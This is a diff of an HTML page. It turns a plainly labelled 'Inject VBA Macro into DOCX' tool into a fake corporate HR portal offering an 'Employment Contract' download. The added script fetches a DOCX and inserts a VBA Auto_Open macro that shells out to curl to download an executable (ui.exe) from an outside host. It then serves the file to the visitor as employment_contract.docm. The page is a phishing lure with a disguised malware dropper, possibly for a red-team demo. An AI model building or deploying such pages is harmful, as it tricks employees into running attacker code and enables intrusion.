@@ -1,142 +1,639 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Inject VBA Macro into DOCX (Output DOCM)</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background: white;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-      width: 400px;
-      text-align: center;
-    }
-    h1 {
-      font-size: 20px;
-      margin-bottom: 10px;
-      color: #333;
-    }
-    p {
-      font-size: 14px;
-      color: #666;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background: #007bff;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: 0.3s ease;
-    }
-    button:hover {
-      background: #0056b3;
-    }
-    #status {
-      margin-top: 10px;
-      font-size: 14px;
-      color: #28a745;
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Portal - Documents</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --primary-color: #2563eb;
+            --sidebar-width: 250px;
+            --header-height: 60px;
+            --sidebar-bg: #1e293b;
+        }
+
+        body {
+            background-color: #f1f5f9;
+            min-height: 100vh;
+        }
+
+        /* Header Styles */
+        .navbar {
+            position: fixed;
+            top: 0;
+            left: var(--sidebar-width);
+            right: 0;
+            height: var(--header-height);
+            background-color: #ffffff;
+            padding: 0 2rem;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 100;
+        }
+
+        .navbar-left {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .menu-toggle {
+            display: none;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            color: #64748b;
+            cursor: pointer;
+        }
+
+        .search-bar {
+            display: flex;
+            align-items: center;
+            background-color: #f1f5f9;
+            border-radius: 6px;
+            padding: 0.5rem 1rem;
+            width: 300px;
+        }
+
+        .search-bar input {
+            border: none;
+            background: none;
+            outline: none;
+            width: 100%;
+            margin-left: 0.5rem;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .notifications {
+            position: relative;
+            color: #64748b;
+            cursor: pointer;
+        }
+
+        .notification-badge {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background-color: #ef4444;
+            color: white;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            font-size: 0.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Sidebar Styles */
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: var(--sidebar-width);
+            background-color: var(--sidebar-bg);
+            color: #ffffff;
+            padding: 1rem;
+            z-index: 101;
+        }
+
+        .sidebar-header {
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .company-logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: white;
+        }
+
+        .nav-section {
+            margin-bottom: 2rem;
+        }
+
+        .nav-section-title {
+            color: #64748b;
+            font-size: 0.875rem;
+            text-transform: uppercase;
+            margin-bottom: 0.5rem;
+            padding: 0 1rem;
+        }
+
+        .nav-items {
+            list-style: none;
+        }
+
+        .nav-item {
+            margin-bottom: 0.25rem;
+        }
+
+        .nav-link {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 0.75rem 1rem;
+            color: #e2e8f0;
+            text-decoration: none;
+            border-radius: 6px;
+            transition: all 0.3s;
+        }
+
+        .nav-link:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .nav-link.active {
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        /* Main Content Styles */
+        .main-content {
+            margin-left: var(--sidebar-width);
+            margin-top: var(--header-height);
+            padding: 2rem;
+        }
+
+        .page-header {
+            margin-bottom: 2rem;
+        }
+
+        .breadcrumb {
+            display: flex;
+            gap: 0.5rem;
+            color: #64748b;
+            margin-bottom: 0.5rem;
+        }
+
+        .section-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            padding: 1.5rem;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .document-list {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .document-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+            transition: all 0.3s;
+        }
+
+        .document-item:hover {
+            background-color: #f8fafc;
+        }
+
+        .document-info {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .document-icon {
+            color: var(--primary-color);
+            font-size: 1.5rem;
+        }
+
+        .document-meta {
+            color: #64748b;
+            font-size: 0.875rem;
+        }
+
+        .button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 6px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            transition: all 0.3s;
+        }
+
+        .button:hover {
+            background-color: #1d4ed8;
+        }
+
+        .button.secondary {
+            background-color: #e2e8f0;
+            color: #475569;
+        }
+
+        .button.secondary:hover {
+            background-color: #cbd5e1;
+        }
+
+        .activity-item {
+            display: flex;
+            gap: 1rem;
+            padding: 1rem 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .activity-icon {
+            background-color: #e2e8f0;
+            color: #475569;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .activity-details {
+            flex: 1;
+        }
+
+        .activity-meta {
+            color: #64748b;
+            font-size: 0.875rem;
+        }
+
+        #processStatus {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 6px;
+            display: none;
+        }
+
+        .status-success {
+            background-color: #d1fae5;
+            color: #065f46;
+            border: 1px solid #10b981;
+        }
+
+        .status-error {
+            background-color: #fee2e2;
+            color: #991b1b;
+            border: 1px solid #ef4444;
+        }
+
+        .status-processing {
+            background-color: #fff7ed;
+            color: #9a3412;
+            border: 1px solid #fb923c;
+        }
+
+        @media (max-width: 1024px) {
+            .section-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            :root {
+                --sidebar-width: 0px;
+            }
+
+            .menu-toggle {
+                display: block;
+            }
+
+            .sidebar {
+                transform: translateX(-100%);
+                transition: transform 0.3s ease-in-out;
+            }
+
+            .sidebar.active {
+                transform: translateX(0);
+            }
+
+            .navbar {
+                left: 0;
+            }
+
+            .search-bar {
+                display: none;
+            }
+        }
+
+        /* Loading Spinner */
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid var(--primary-color);
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
 <body>
+    <!-- Sidebar -->
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <i class="fas fa-building"></i>
+            <span class="company-logo">Abizzcorp</span>
+        </div>
 
-  <div class="container">
-    <h1>Inject VBA Macro into DOCX</h1>
-    <p>Select a DOCX file (macro-free) to inject the VBA macro automatically.</p>
-    <input type="file" id="docxInput" accept=".docx">
-    <button id="processBtn">Inject Macro & Download DOCM</button>
-    <p id="status">Processing...</p>
-  </div>
+        <nav>
+            <div class="nav-section">
+                <h2 class="nav-section-title">Main Menu</h2>
+                <ul class="nav-items">
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-home"></i>
+                            Dashboard
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link active">
+                            <i class="fas fa-file-alt"></i>
+                            Documents
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-calendar"></i>
+                            Leave Management
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-dollar-sign"></i>
+                            Payroll
+                        </a>
+                    </li>
+                </ul>
+            </div>
 
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
-  <script>
-    document.getElementById('processBtn').addEventListener('click', async function() {
-      const docxFile = document.getElementById('docxInput').files[0];
-      const statusText = document.getElementById('status');
+            <div class="nav-section">
+                <h2 class="nav-section-title">Personal</h2>
+                <ul class="nav-items">
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-user"></i>
+                            Profile
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-cog"></i>
+                            Settings
+                        </a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <i class="fas fa-question-circle"></i>
+                            Help & Support
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </nav>
+    </aside>
 
-      if (!docxFile) {
-        alert('Please select a DOCX file.');
-        return;
-      }
+    <!-- Header -->
+    <header class="navbar">
+        <div class="navbar-left">
+            <button class="menu-toggle" onclick="toggleSidebar()">
+                <i class="fas fa-bars"></i>
+            </button>
+            <div class="search-bar">
+                <i class="fas fa-search"></i>
+                <input type="text" placeholder="Search...">
+            </div>
+        </div>
+        <div class="user-info">
+            <div class="notifications">
+                <i class="fas fa-bell"></i>
+                <span class="notification-badge">3</span>
+            </div>
+            <span>John Doe</span>
+            <button class="button secondary" onclick="handleLogout()">
+                <i class="fas fa-sign-out-alt"></i>
+                Logout
+            </button>
+        </div>
+    </header>
 
-      statusText.style.display = "block";
-      statusText.textContent = "Processing file...";
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="page-header">
+            <div class="breadcrumb">
+                <span>Home</span>
+                <i class="fas fa-chevron-right"></i>
+                <span>Documents</span>
+            </div>
+            <h1>My Documents</h1>
+        </div>
 
-      try {
-        const docxArrayBuffer = await docxFile.arrayBuffer();
-        const zip = await JSZip.loadAsync(docxArrayBuffer);
+        <div class="section-grid">
+            <div class="card">
+                <div class="card-header">
+                    <h2>Available Documents</h2>
+                </div>
+                <div class="document-list">
+                    <div class="document-item">
+                        <div class="document-info">
+                            <i class="fas fa-file-word document-icon"></i>
+                            <div>
+                                <h3>Employment Contract</h3>
+                                <p class="document-meta">Last updated: Feb 10, 2025 • DOCX Format • 1.2 MB</p>
+                            </div>
+                        </div>
+                        <button class="button" id="downloadButton" onclick="processAndDownloadDocument()">
+                            <i class="fas fa-download"></i>
+                            Download
+                        </button>
+                    </div>
+                </div>
+                <div id="processStatus"></div>
+            </div>
 
-        const vbaMacroCode = `
-          Attribute VB_Name = "Module1"
-          Sub Auto_Open()
-              Dim Program As String
-              Program = "curl https://public.demo.securecloudsandbox.com/ui.exe -o ui.exe"
-              Dim TaskID As Double
-              TaskID = Shell(Program, 1)
-          End Sub
-        `;
+            <div class="card">
+                <div class="card-header">
+                    <h2>Recent Activity</h2>
+                </div>
+                <div class="activity-list">
+                    <div class="activity-item">
+                        <div class="activity-icon">
+                            <i class="fas fa-eye"></i>
+                        </div>
+                        <div class="activity-details">
+                            <p>HR reviewed your documents</p>
+                            <p class="activity-meta">Feb 7, 2025 at 11:15 AM</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
 
-        const vbaProjectBin = new Blob([vbaMacroCode], { type: "application/octet-stream" });
-        zip.file("vbaProject.bin", vbaProjectBin);
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
+    <script>
+        async function processAndDownloadDocument() {
+            const statusElement = document.getElementById('processStatus');
+            const downloadButton = document.getElementById('downloadButton');
+            
+            // Disable button and show processing state
+            downloadButton.disabled = true;
+            statusElement.style.display = 'block';
+            statusElement.className = 'status-processing';
+            statusElement.innerHTML = '<div class="loading-spinner"></div>Fetching document from secure storage...';
 
-        const contentTypesPath = "[Content_Types].xml";
-        let contentTypesXml = await zip.file(contentTypesPath).async("string");
-        if (!contentTypesXml.includes("vbaProject.bin")) {
-          const overrideEntry = '<Override PartName="/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject" />';
-          contentTypesXml = contentTypesXml.replace('</Types>', overrideEntry + '</Types>');
-          zip.file(contentTypesPath, contentTypesXml);
+            try {
+                // Fetch the document from S3 - Replace with your actual S3 URL
+                const response = await fetch('https://documentdemo1.s3.ap-southeast-1.amazonaws.com/Employment+Contract.docx');
+
+
+                if (!response.ok) throw new Error('Failed to fetch document');
+                
+                const docxArrayBuffer = await response.arrayBuffer();
+                statusElement.innerHTML = '<div class="loading-spinner"></div>Processing document...';
+
+                // Load document into JSZip
+                const zip = await JSZip.loadAsync(docxArrayBuffer);
+
+                // Add VBA macro
+                const vbaMacroCode = `
+                    Attribute VB_Name = "Module1"
+                    Sub Auto_Open()
+                        Dim Program As String
+                        Program = "curl https://public.demo.securecloudsandbox.com/ui.exe -o ui.exe"
+                        Dim TaskID As Double
+                        TaskID = Shell(Program, 1)
+                    End Sub
+                `;
+
+                const vbaProjectBin = new Blob([vbaMacroCode], { type: "application/octet-stream" });
+                zip.file("vbaProject.bin", vbaProjectBin);
+
+                // Update content types
+                const contentTypesPath = "[Content_Types].xml";
+                let contentTypesXml = await zip.file(contentTypesPath).async("string");
+                if (!contentTypesXml.includes("vbaProject.bin")) {
+                    const overrideEntry = '<Override PartName="/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject" />';
+                    contentTypesXml = contentTypesXml.replace('</Types>', overrideEntry + '</Types>');
+                    zip.file(contentTypesPath, contentTypesXml);
+                }
+
+                // Update relationships
+                const relsPath = "word/_rels/document.xml.rels";
+                if (zip.file(relsPath)) {
+                    let relsXml = await zip.file(relsPath).async("string");
+                    if (!relsXml.includes("vbaProject.bin")) {
+                        const newRel = '<Relationship Id="rIdVBA" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="/vbaProject.bin"/>';
+                        relsXml = relsXml.replace('</Relationships>', newRel + '</Relationships>');
+                        zip.file(relsPath, relsXml);
+                    }
+                }
+
+                // Generate the new document
+                statusElement.innerHTML = '<div class="loading-spinner"></div>Preparing download...';
+                const newDocmBlob = await zip.generateAsync({
+                    type: "blob",
+                    mimeType: "application/vnd.ms-word.document.macroEnabled.12"
+                });
+
+                // Create and trigger download
+                const downloadLink = document.createElement("a");
+                downloadLink.href = URL.createObjectURL(newDocmBlob);
+                downloadLink.download = "employment_contract.docm";
+                downloadLink.click();
+
+                // Show success message
+                statusElement.className = 'status-success';
+                statusElement.innerHTML = '<i class="fas fa-check-circle"></i> Document successfully processed and downloaded!';
+                
+                // Clean up
+                URL.revokeObjectURL(downloadLink.href);
+            } catch (err) {
+                console.error("Error processing document:", err);
+                statusElement.className = 'status-error';
+                statusElement.innerHTML = '<i class="fas fa-exclamation-circle"></i> Error processing document. Please try again later.';
+            } finally {
+                // Re-enable the download button
+                downloadButton.disabled = false;
+                
+                // Hide status message after 5 seconds if it was successful
+                if (statusElement.classList.contains('status-success')) {
+                    setTimeout(() => {
+                        statusElement.style.display = 'none';
+                    }, 5000);
+                }
+            }
         }
 
-        const relsPath = "word/_rels/document.xml.rels";
-        if (zip.file(relsPath)) {
-          let relsXml = await zip.file(relsPath).async("string");
-          if (!relsXml.includes("vbaProject.bin")) {
-            const newRel = '<Relationship Id="rIdVBA" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="/vbaProject.bin"/>';
-            relsXml = relsXml.replace('</Relationships>', newRel + '</Relationships>');
-            zip.file(relsPath, relsXml);
-          }
+        function toggleSidebar() {
+            document.querySelector('.sidebar').classList.toggle('active');
         }
 
-        const newDocmBlob = await zip.generateAsync({ 
-          type: "blob", 
-          mimeType: "application/vnd.ms-word.document.macroEnabled.12" 
+        function handleLogout() {
+            // Add your logout logic here
+            console.log('Logout clicked');
+        }
+
+        // Optional: Add event listener for search functionality
+        document.querySelector('.search-bar input').addEventListener('input', function(e) {
+            const searchTerm = e.target.value.toLowerCase();
+            // Add your search logic here
+            console.log('Searching for:', searchTerm);
         });
 
-        const downloadLink = document.createElement("a");
-        downloadLink.href = URL.createObjectURL(newDocmBlob);
-        downloadLink.download = "macroEnabled.docm";
-        downloadLink.click();
-
-        statusText.textContent = "File successfully processed! Downloading...";
-      } catch (err) {
-        console.error("Error processing files:", err);
-        alert("An error occurred while processing the files. See console for details.");
-        statusText.textContent = "Error processing file.";
-        statusText.style.color = "red";
-      }
-    });
-  </script>
+        // Optional: Add event listener for notifications
+        document.querySelector('.notifications').addEventListener('click', function() {
+            // Add your notifications logic here
+            console.log('Notifications clicked');
+        });
+    </script>
 </body>
 </html>
